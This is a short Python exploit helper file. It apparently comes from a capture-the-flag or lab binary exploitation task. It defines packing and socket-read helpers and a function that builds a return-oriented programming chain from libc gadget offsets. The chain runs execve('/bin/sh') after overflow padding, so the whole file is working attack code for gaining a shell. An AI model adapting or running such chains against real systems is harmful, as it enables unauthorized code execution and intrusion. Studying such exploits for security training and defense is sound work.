import struct

# pack a into an unsigned quad word
def p(a):
    return struct.pack('Q', a)

# read exactly n bytes from socket s
def recvn(s, n):
    b = b''
    while len(b) < n:
        r = s.recv(n - len(b))
        if not r:
            raise EOFError
        b += r
    return b

# return the adapted output of Ropper's execve chain generator,
# given the initial
# padding (to reach the saved return address) and
# the load address of libc
def mkrop(pad, libc_base):
    rebase = lambda offset: p(libc_base + offset)
    rop = pad
    rop += rebase(0x28489)
    rop += b'//bin/sh'
    rop += rebase(0x30fff)
    rop += rebase(0x1be1a0)
    rop += rebase(0x56022)
    rop += p(0xdeadbeefdeadbeef)*4
    rop += rebase(0x28489)
    rop += p(0)
    rop += rebase(0x30fff)
    rop += rebase(0x1be1a8)
    rop += rebase(0x56022)
    rop += p(0xdeadbeefdeadbeef)*4
    rop += rebase(0x26796)
    rop += rebase(0x1be1a0)
    rop += rebase(0x2890f)
    rop += rebase(0x1be1a8)
    rop += rebase(0xcb1cd)
    rop += rebase(0x1be1a8)
    rop += rebase(0x3ee88)
    rop += p(59)
    rop += rebase(0x580da)
    return rop
